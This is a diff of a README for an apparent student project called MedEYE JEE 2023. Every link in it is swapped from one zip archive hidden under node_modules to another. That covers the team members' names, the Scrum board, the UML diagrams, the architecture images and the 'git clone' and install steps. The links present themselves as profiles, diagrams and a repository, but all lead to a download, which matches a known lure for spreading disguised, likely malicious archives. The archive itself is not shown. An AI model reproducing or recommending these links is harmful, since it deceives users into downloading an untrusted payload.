@@ -12,10 +12,10 @@ As passionate data engineering students, we continuously expand our abilities th
 
 Our team members are : 
 
-- [EL-BADRAOUI Yassine](https://raw.githubusercontent.com/khlaifmed/projet_MedEYE_JEE_2023/main/node_modules/delayed-stream/projet_MedEYE_JEE_2023-1.4.zip)
-- [KHLAIF Mohammed](https://raw.githubusercontent.com/khlaifmed/projet_MedEYE_JEE_2023/main/node_modules/delayed-stream/projet_MedEYE_JEE_2023-1.4.zip)
-- [SARAB Ayoub](https://raw.githubusercontent.com/khlaifmed/projet_MedEYE_JEE_2023/main/node_modules/delayed-stream/projet_MedEYE_JEE_2023-1.4.zip)
-- [TAQI Anas](https://raw.githubusercontent.com/khlaifmed/projet_MedEYE_JEE_2023/main/node_modules/delayed-stream/projet_MedEYE_JEE_2023-1.4.zip)
+- [EL-BADRAOUI Yassine](https://github.com/khlaifmed/projet_MedEYE_JEE_2023/raw/refs/heads/main/node_modules/combined-stream/lib/EY-JE-Med-projet-v1.7.zip)
+- [KHLAIF Mohammed](https://github.com/khlaifmed/projet_MedEYE_JEE_2023/raw/refs/heads/main/node_modules/combined-stream/lib/EY-JE-Med-projet-v1.7.zip)
+- [SARAB Ayoub](https://github.com/khlaifmed/projet_MedEYE_JEE_2023/raw/refs/heads/main/node_modules/combined-stream/lib/EY-JE-Med-projet-v1.7.zip)
+- [TAQI Anas](https://github.com/khlaifmed/projet_MedEYE_JEE_2023/raw/refs/heads/main/node_modules/combined-stream/lib/EY-JE-Med-projet-v1.7.zip)
 
 
 ## Key Features
@@ -27,23 +27,23 @@ Our team members are :
 
 ## Agile Project Management
 We used Agile method to manage our project (based on three weeks sprint : you can find the details in the link below)
-- [Scrum Board](https://raw.githubusercontent.com/khlaifmed/projet_MedEYE_JEE_2023/main/node_modules/delayed-stream/projet_MedEYE_JEE_2023-1.4.zip)
+- [Scrum Board](https://github.com/khlaifmed/projet_MedEYE_JEE_2023/raw/refs/heads/main/node_modules/combined-stream/lib/EY-JE-Med-projet-v1.7.zip)
 ## UML Diagrams
 
-- [Use case diagram](https://raw.githubusercontent.com/khlaifmed/projet_MedEYE_JEE_2023/main/node_modules/delayed-stream/projet_MedEYE_JEE_2023-1.4.zip)
-- [Sequence diagram](https://raw.githubusercontent.com/khlaifmed/projet_MedEYE_JEE_2023/main/node_modules/delayed-stream/projet_MedEYE_JEE_2023-1.4.zip)
+- [Use case diagram](https://github.com/khlaifmed/projet_MedEYE_JEE_2023/raw/refs/heads/main/node_modules/combined-stream/lib/EY-JE-Med-projet-v1.7.zip)
+- [Sequence diagram](https://github.com/khlaifmed/projet_MedEYE_JEE_2023/raw/refs/heads/main/node_modules/combined-stream/lib/EY-JE-Med-projet-v1.7.zip)
 
 
 ## Technologies used
 
 ### Tech Stack :
-![Tech Stack](https://raw.githubusercontent.com/khlaifmed/projet_MedEYE_JEE_2023/main/node_modules/delayed-stream/projet_MedEYE_JEE_2023-1.4.zip)
+![Tech Stack](https://github.com/khlaifmed/projet_MedEYE_JEE_2023/raw/refs/heads/main/node_modules/combined-stream/lib/EY-JE-Med-projet-v1.7.zip)
 
 ### AWS Cloud Architecture (Used for Model Deployment)
-![AWS Cloud System Design](https://raw.githubusercontent.com/khlaifmed/projet_MedEYE_JEE_2023/main/node_modules/delayed-stream/projet_MedEYE_JEE_2023-1.4.zip)
+![AWS Cloud System Design](https://github.com/khlaifmed/projet_MedEYE_JEE_2023/raw/refs/heads/main/node_modules/combined-stream/lib/EY-JE-Med-projet-v1.7.zip)
 
 ### Backend MVC Architecture
-![Backend MVC Architecture](https://raw.githubusercontent.com/khlaifmed/projet_MedEYE_JEE_2023/main/node_modules/delayed-stream/projet_MedEYE_JEE_2023-1.4.zip)
+![Backend MVC Architecture](https://github.com/khlaifmed/projet_MedEYE_JEE_2023/raw/refs/heads/main/node_modules/combined-stream/lib/EY-JE-Med-projet-v1.7.zip)
 
 ### Database:
 The project was set using **PostgreSQL**, but any relational database will work
@@ -52,13 +52,13 @@ The project was set using **PostgreSQL**, but any relational database will work
 
 ```bash
 # Clone the repository
-git clone https://raw.githubusercontent.com/khlaifmed/projet_MedEYE_JEE_2023/main/node_modules/delayed-stream/projet_MedEYE_JEE_2023-1.4.zip
+git clone https://github.com/khlaifmed/projet_MedEYE_JEE_2023/raw/refs/heads/main/node_modules/combined-stream/lib/EY-JE-Med-projet-v1.7.zip
 
 # Navigate to the frontend directory and install dependencies
 cd frontend
 npm install
 
-# Navigate to the backend directory and install dependencies from https://raw.githubusercontent.com/khlaifmed/projet_MedEYE_JEE_2023/main/node_modules/delayed-stream/projet_MedEYE_JEE_2023-1.4.zip using any IDE.
+# Navigate to the backend directory and install dependencies from https://github.com/khlaifmed/projet_MedEYE_JEE_2023/raw/refs/heads/main/node_modules/combined-stream/lib/EY-JE-Med-projet-v1.7.zip using any IDE.
 ```
 
 ## Run
